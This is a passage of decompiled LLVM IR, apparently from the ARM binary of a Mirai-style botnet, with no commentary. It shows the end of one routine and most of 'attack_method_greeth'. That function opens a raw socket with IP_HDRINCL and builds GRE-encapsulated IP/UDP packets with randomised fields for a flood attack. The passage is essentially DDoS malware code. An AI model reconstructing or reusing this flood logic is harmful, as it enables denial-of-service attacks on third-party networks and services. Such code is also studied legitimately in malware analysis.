  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
